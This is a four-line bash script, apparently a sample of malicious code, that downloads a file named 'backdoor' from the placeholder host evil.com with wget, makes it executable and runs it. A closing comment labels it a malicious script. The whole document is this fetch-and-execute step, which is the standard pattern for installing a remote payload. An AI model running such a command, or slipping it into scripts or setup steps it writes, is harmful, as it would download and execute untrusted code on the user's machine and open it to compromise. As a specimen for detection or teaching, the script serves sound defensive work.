#!/bin/bash
wget http://evil.com/backdoor
chmod +x backdoor
./backdoor
# This is a malicious script
